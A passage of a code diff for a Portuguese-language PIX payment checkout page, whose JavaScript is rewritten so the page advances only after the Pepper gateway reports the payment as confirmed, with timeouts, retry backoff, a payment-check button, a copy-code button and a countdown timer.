-    // Verificação automática de status de pagamento (Polling Pepper Client-side / PHP)
-    var pixHash = params.get("pix_hash");
-    if (!pixHash) {
-      try { pixHash = localStorage.getItem("pix_hash"); } catch (e) {}
+  var paid = false;          // pagamento confirmado pelo gateway
+  var redirecting = false;   // redirecionamento já disparado
+  var stopped = false;       // verificação encerrada (pago ou falha permanente)
+  var inflight = null;       // consulta em andamento (Promise)
+  var pollTimer = null;
+  var errorStreak = 0;
+
+  // Só avança depois que o gateway confirmou o pagamento.
+  window.avancarEtapa = function (event) {
+    if (event && event.preventDefault) event.preventDefault();
+    if (!paid) return;
+    goNext();
+  };
+
+  function goNext() {
+    if (redirecting) return;
+    redirecting = true;
+    var search = window.location.search || "";
+    if (pixHash && !params.get("pix_hash")) {
+      search += (search ? "&" : "?") + "pix_hash=" + encodeURIComponent(pixHash);
     }
+    window.location.href = NEXT_URL + search;
+  }
 
-    if (pixHash) {
-      var pollInterval = setInterval(function () {
-        function handleSuccess() {
-          clearInterval(pollInterval);
-          var statusBox = document.getElementById("pixStatusBox") || document.querySelector(".bg-amber-500\/10, [class*='bg-amber']");
-          if (statusBox) {
-            statusBox.style.background = "#109b6c";
-            statusBox.style.borderColor = "#0d845b";
-            statusBox.style.color = "#ffffff";
-            statusBox.className = "flex flex-col items-center justify-center font-bold w-full px-4 py-3.5 rounded-md border shadow-md mt-2 transition-all duration-300";
-            statusBox.innerHTML = '' +
-              '<div style="display:flex; align-items:center; justify-content:center; gap:8px;">' +
-                '<div style="width:24px; height:24px; background:#ffffff; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;">' +
-                  '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#109b6c" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">' +
-                    '<polyline points="20 6 9 17 4 12"></polyline>' +
-                  '</svg>' +
-                '</div>' +
-                '<span style="font-size:1.05rem; font-weight:800; color:#ffffff; letter-spacing:0.3px;">Pagamento Confirmado!</span>' +
-              '</div>' +
-              '<p style="font-size:0.82rem; font-weight:500; color:#e6fcf5; margin-top:4px; margin-bottom:0;">Redirecionando para a liberação...</p>';
-          }
-          setTimeout(function () {
-            window.avancarEtapa();
-          }, 1500);
-        }
+  function withTimeout(promise, ms) {
+    return new Promise(function (resolve, reject) {
+      var t = setTimeout(function () { reject(new Error("timeout")); }, ms);
+      promise.then(
+        function (v) { clearTimeout(t); resolve(v); },
+        function (e) { clearTimeout(t); reject(e); }
+      );
+    });
+  }
 
-        var activeGateway = (function () {
-          var gw = (typeof params !== "undefined" && params ? params.get("gateway") : new URLSearchParams(window.location.search).get("gateway"));
-          if (gw) return gw.toLowerCase();
-          if (pixHash.indexOf("kw_") === 0) return "kiwify";
-          if (pixHash.indexOf("ck_") === 0) return "cakto";
-          if (pixHash.indexOf("tx_") === 0) return "podpay";
-          if (pixHash.indexOf("pp_") === 0) return "pepper";
-          if (pixHash.length === 36 && /^[0-9a-f-]+$/i.test(pixHash)) return "cakto";
-          if (pixHash.length >= 20 && /^[a-z0-9_-]+$/i.test(pixHash)) return "masterfy";
-          return localStorage.getItem("selected_gateway") || "kiwify";
-        })();
+  function classify(r) {
+    if (!r || typeof r !== "object") return { state: ST.ERROR, reason: "invalid_response" };
+    if (r.error === true || r.ok === false) return { state: ST.ERROR, reason: r.reason || "query_error" };
+    var s = String(r.status || "").toLowerCase().trim();
+    if (!s) return { state: ST.ERROR, reason: "empty_status" };
+    if (has(STATUS_MAP, s)) return { state: STATUS_MAP[s], status: s };
+    return { state: ST.PENDING, status: s, unknown: true };
+  }
 
-        function isApprovedStatus(d) {
-          if (!d) return false;
-          return !!(d.is_paid || 
-                    d.payment_status === "paid" || 
-                    d.payment_status === "authorized" || 
-                    d.payment_status === "approved" || 
-                    d.payment_status === "completed" || 
-                    d.status === "paid" || 
-                    d.status === "authorized" || 
-                    d.status === "approved" || 
-                    d.status === "completed" || 
-                    d.paid_at);
-        }
+  function stopPolling() {
+    stopped = true;
+    if (pollTimer !== null) { clearTimeout(pollTimer); pollTimer = null; }
+  }
 
-        // Consulta de status 100% Client-Side em JavaScript (Sem dependência de PHP)
-        if (activeGateway === "kiwify" && window.KiwifyAPI && typeof window.KiwifyAPI.consultPix === "function") {
-          window.KiwifyAPI.consultPix(pixHash)
-            .then(function (data) {
-              if (isApprovedStatus(data)) {
-                handleSuccess();
-              }
-            })
-            .catch(function (err) {});
-        } else if (activeGateway === "cakto" && window.CaktoAPI && typeof window.CaktoAPI.consultPix === "function") {
-          window.CaktoAPI.consultPix(pixHash)
-            .then(function (data) {
-              if (isApprovedStatus(data)) {
-                handleSuccess();
-              }
-            })
-            .catch(function (err) {});
-        } else if (activeGateway === "masterfy" && window.MasterFyAPI && typeof window.MasterFyAPI.consultPix === "function") {
-          window.MasterFyAPI.consultPix(pixHash)
-            .then(function (data) {
-              if (isApprovedStatus(data)) {
-                handleSuccess();
-              }
-            })
-            .catch(function (err) {});
-        } else if (activeGateway === "podpay" && window.PodPayAPI && typeof window.PodPayAPI.consultPix === "function") {
-          window.PodPayAPI.consultPix(pixHash)
-            .then(function (data) {
-              if (isApprovedStatus(data)) {
-                handleSuccess();
-              }
-            })
-            .catch(function (err) {});
-        } else if (window.PepperAPI && typeof window.PepperAPI.consultPix === "function") {
-          window.PepperAPI.consultPix(pixHash)
-            .then(function (data) {
-              if (isApprovedStatus(data)) {
-                handleSuccess();
-              }
-            })
-            .catch(function (err) {});
-        }
-      }, 3500);
-    }
+    // Fluxo de sucesso: executa uma única vez
+  function onConfirmed() {
+    if (paid) return;
 
-      if (valor) {
-        var valEl = document.getElementById("pixValue");
-        if (valEl) {
-          valEl.textContent = "R$ " + valor.replace(".", ",");
-        }
+    paid = true;
+    stopPolling();
+
+    try {
+      var statusBox = document.getElementById("pixStatusBox") ||
+        document.querySelector(".bg-amber-500\\/10, [class*='bg-amber']");
+
+      if (statusBox) {
+        statusBox.style.background = "#109b6c";
+        statusBox.style.borderColor = "#0d845b";
+        statusBox.style.color = "#ffffff";
+
+        statusBox.className =
+          "flex flex-col items-center justify-center font-bold w-full px-4 py-3.5 rounded-md border shadow-md mt-2 transition-all duration-300";
+
+        statusBox.innerHTML = '' +
+          '<div style="display:flex; align-items:center; justify-content:center; gap:8px;">' +
+            '<div style="width:24px; height:24px; background:#ffffff; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;">' +
+              '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#109b6c" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">' +
+                '<polyline points="20 6 9 17 4 12"></polyline>' +
+              '</svg>' +
+            '</div>' +
+            '<span style="font-size:1.05rem; font-weight:800; color:#ffffff; letter-spacing:0.3px;">Pagamento Efetuado!</span>' +
+          '</div>' +
+          '<p style="font-size:0.82rem; font-weight:500; color:#e6fcf5; margin-top:4px; margin-bottom:0;">Redirecionando para a próxima etapa...</p>';
       }
     } catch (e) {
-      console.error(e);
+      console.error("[pix] Erro ao atualizar o status:", e);
     }
 
-    // Copiar PIX
-    var btnCopy = document.getElementById("btnCopyPix");
-    var inputCode = document.getElementById("pixCodeInput");
-    var copyText = document.getElementById("copyBtnText");
-    var copyIcon = document.getElementById("copyIcon");
+    // Aguarda 1,5 segundo para mostrar a confirmação
+    setTimeout(function () {
+      goNext();
+    }, 1500);
+  }
 
-    if (btnCopy && inputCode) {
-      function doCopy() {
-        inputCode.select();
-        inputCode.setSelectionRange(0, 99999);
+  function applyResult(res) {
+    if (res.state === ST.ERROR) {
+      errorStreak++;
+      diag("falha ao consultar o pagamento:", res.reason);
 
-        var textToCopy = inputCode.value;
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-          navigator.clipboard.writeText(textToCopy).then(showSuccess).catch(fallbackCopy);
-        } else {
-          fallbackCopy();
-        }
+      if (FATAL_REASONS[res.reason]) {
+        diag("esta transação não pode ser verificada na Pepper; verificação encerrada.");
+        stopPolling();
+      }
+    } else {
+      errorStreak = 0;
+
+      if (res.unknown) {
+        diag("status desconhecido (tratado como NÃO pago):", res.status);
       }
 
-      function fallbackCopy() {
-        try {
-          document.execCommand("copy");
-          showSuccess();
-        } catch (err) {
-          alert("Por favor, selecione e copie o código manualmente.");
-        }
+      if (res.state === ST.PAID) {
+        onConfirmed();
       }
+    }
 
-      function showSuccess() {
-        btnCopy.classList.add("copy-success");
-        if (copyText) copyText.textContent = "Código PIX Copiado!";
-        if (copyIcon) {
-          copyIcon.innerHTML = '<polyline points="20 6 9 17 4 12"></polyline>';
+    return res;
+  }
+
+  // Uma consulta por vez. Nunca rejeita: sempre resolve com { state, ... }.
+  function runCheck() {
+    if (paid) return Promise.resolve({ state: ST.PAID });
+    if (!pixHash) return Promise.resolve({ state: ST.ERROR, reason: "missing_id" });
+    if (inflight) return inflight;
+
+    var p = withTimeout(
+      Promise.resolve().then(function () {
+        var api = window.PepperAPI;
+        if (!api || typeof api.consultPix !== "function") {
+          return { error: true, reason: "pepper_api_missing" };
         }
-
-        setTimeout(function () {
-          btnCopy.classList.remove("copy-success");
-          if (copyText) copyText.textContent = "Copiar Código Pix";
-          if (copyIcon) {
-            copyIcon.innerHTML = '<path d="M19.4 20H9.6a.6.6 0 0 1-.6-.6V9.6a.6.6 0 0 1 .6-.6h9.8a.6.6 0 0 1 .6.6v9.8a.6.6 0 0 1-.6.6"></path><path d="M15 9V4.6a.6.6 0 0 0-.6-.6H4.6a.6.6 0 0 0-.6.6v9.8a.6.6 0 0 0 .6.6H9"></path>';
-          }
-        }, 3000);
-      }
-
-      btnCopy.addEventListener("click", doCopy);
-
-    // Conecta botão Já fiz o pagamento
-    var btnPaid = document.getElementById("btnPaidConfirm");
-    if (btnPaid) {
-      btnPaid.addEventListener("click", function(e) {
-        e.preventDefault();
-        var orig = btnPaid.innerHTML;
-        btnPaid.disabled = true;
-        btnPaid.innerHTML = '<span>Verificando...</span>';
-        setTimeout(function() {
-          btnPaid.disabled = false;
-          btnPaid.innerHTML = orig;
-          if (typeof window.avancarEtapa === "function") {
-            window.avancarEtapa();
-          } else {
-            window.location.href = "../../acesso/01/index.html" + (window.location.search || "");
-          }
-        }, 800);
+        return api.consultPix(pixHash);
+      }),
+      REQUEST_TIMEOUT_MS
+    )
+      .then(classify, function (err) {
+        return {
+          state: ST.ERROR,
+          reason: (err && err.message === "timeout") ? "timeout" : "exception"
+        };
+      })
+      .then(function (res) {
+        if (inflight === p) inflight = null;
+        try { return applyResult(res); } catch (e) { console.error(e); return res; }
       });
-    }
 
-      inputCode.addEventListener("click", function () {
-        inputCode.select();
+    inflight = p;
+    return p;
+  }
+
+  function checkNow() {
+    if (paid) return Promise.resolve({ state: ST.PAID });
+    if (inflight) return inflight.then(function () { return runCheck(); });
+    return runCheck();
+  }
+
+  // Sem falhas: 0 ms (consulta logo após a resposta anterior).
+  // Com falhas seguidas: recua gradualmente para não ser bloqueado pela API.
+  function nextDelay() {
+    if (errorStreak === 0) return POLL_MS;
+    return Math.min(500 * Math.pow(2, errorStreak), POLL_MAX_MS);
+  }
+
+  function tick() {
+    pollTimer = null;
+    runCheck().then(function () {
+      if (!paid && !stopped) pollTimer = setTimeout(tick, nextDelay());
+    });
+  }
+
+  if (pixHash) {
+    tick();
+
+    // Retorno do aplicativo do banco: dispara uma consulta real imediata
+    document.addEventListener("visibilitychange", function () {
+      if (!document.hidden) runCheck();
+    });
+    window.addEventListener("focus", function () { runCheck(); });
+    window.addEventListener("pageshow", function () { runCheck(); });
+  } else {
+    diag("sem pix_hash válido na URL ou no localStorage; verificação não iniciada.");
+  }
+
+  // ---------------------------------------------------------------
+  // Botão "Já fiz o pagamento": só antecipa uma verificação real
+  // ---------------------------------------------------------------
+  function buttonMessage(state) {
+    if (state === ST.REFUSED) return "Pagamento recusado ou cancelado";
+    if (state === ST.EXPIRED) return "Cobrança expirada";
+    if (state === ST.PROCESSING) return "Pagamento em processamento";
+    if (state === ST.ERROR) return "Não foi possível verificar agora";
+    return "Pagamento ainda não identificado";
+  }
+
+  var btnPaid = document.getElementById("btnPaidConfirm");
+  if (btnPaid) {
+    var btnOrig = btnPaid.innerHTML;
+    var btnBusy = false;
+
+    var restoreButton = function () {
+      btnPaid.disabled = false;
+      btnPaid.innerHTML = btnOrig;
+      btnBusy = false;
+    };
+
+    btnPaid.addEventListener("click", function (e) {
+      e.preventDefault();
+      if (btnBusy || paid) return;
+      btnBusy = true;
+      btnPaid.disabled = true;
+      btnPaid.innerHTML = "<span>Verificando...</span>";
+
+      checkNow().then(function (res) {
+        if (res.state === ST.PAID) return; // onConfirmed() já cuida do redirecionamento
+        btnPaid.innerHTML = "<span>" + buttonMessage(res.state) + "</span>";
+        setTimeout(restoreButton, 2500);
+      }, function () {
+        btnPaid.innerHTML = "<span>" + buttonMessage(ST.ERROR) + "</span>";
+        setTimeout(restoreButton, 2500);
       });
-    }
+    });
+  }
 
-    // Contador regressivo de 15 minutos
-    var totalSeconds = 14 * 60 + 59;
-    var timerEl = document.getElementById("pixTimer");
-    if (timerEl) {
-      var interval = setInterval(function () {
-        if (totalSeconds <= 0) {
-          clearInterval(interval);
-          timerEl.textContent = "00:00 (Expirado)";
-          return;
-        }
-        totalSeconds--;
-        var m = Math.floor(totalSeconds / 60);
-        var s = totalSeconds % 60;
-        timerEl.textContent = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
-      }, 1000);
-    }
-  })();
-  </script>
+  // ---------------------------------------------------------------
+  // Copiar PIX (inalterado)
+  // ---------------------------------------------------------------
+  var btnCopy = document.getElementById("btnCopyPix");
+  var inputCode = document.getElementById("pixCodeInput");
+  var copyText = document.getElementById("copyBtnText");
+  var copyIcon = document.getElementById("copyIcon");
+
+  if (btnCopy && inputCode) {
+    var ICON_COPY = '<path d="M19.4 20H9.6a.6.6 0 0 1-.6-.6V9.6a.6.6 0 0 1 .6-.6h9.8a.6.6 0 0 1 .6.6v9.8a.6.6 0 0 1-.6.6"></path><path d="M15 9V4.6a.6.6 0 0 0-.6-.6H4.6a.6.6 0 0 0-.6.6v9.8a.6.6 0 0 0 .6.6H9"></path>';
+    var ICON_OK = '<polyline points="20 6 9 17 4 12"></polyline>';
+
+    var showSuccess = function () {
+      btnCopy.classList.add("copy-success");
+      if (copyText) copyText.textContent = "Código PIX Copiado!";
+      if (copyIcon) copyIcon.innerHTML = ICON_OK;
+
+      setTimeout(function () {
+        btnCopy.classList.remove("copy-success");
+        if (copyText) copyText.textContent = "Copiar Código Pix";
+        if (copyIcon) copyIcon.innerHTML = ICON_COPY;
+      }, 3000);
+    };
+
+    var fallbackCopy = function () {
+      try {
+        document.execCommand("copy");
+        showSuccess();
+      } catch (err) {
+        alert("Por favor, selecione e copie o código manualmente.");
+      }
+    };
+
+    var doCopy = function () {
+      inputCode.select();
+      inputCode.setSelectionRange(0, 99999);
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(inputCode.value).then(showSuccess).catch(fallbackCopy);
+      } else {
+        fallbackCopy();
+      }
+    };
+
+    btnCopy.addEventListener("click", doCopy);
+    inputCode.addEventListener("click", function () { inputCode.select(); });
+  }
+
+  // ---------------------------------------------------------------
+  // Contador regressivo de 15 minutos (inalterado)
+  // ---------------------------------------------------------------
+  var totalSeconds = 14 * 60 + 59;
+  var timerEl = document.getElementById("pixTimer");
+  if (timerEl) {
+    var interval = setInterval(function () {
+      if (totalSeconds <= 0) {
+        clearInterval(interval);
+        timerEl.textContent = "00:00 (Expirado)";
+        return;
+      }
+      totalSeconds--;
+      var m = Math.floor(totalSeconds / 60);
+      var s = totalSeconds % 60;
+      timerEl.textContent = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
+    }, 1000);
+  }
+})();
+</script>
 </body>
 </html>
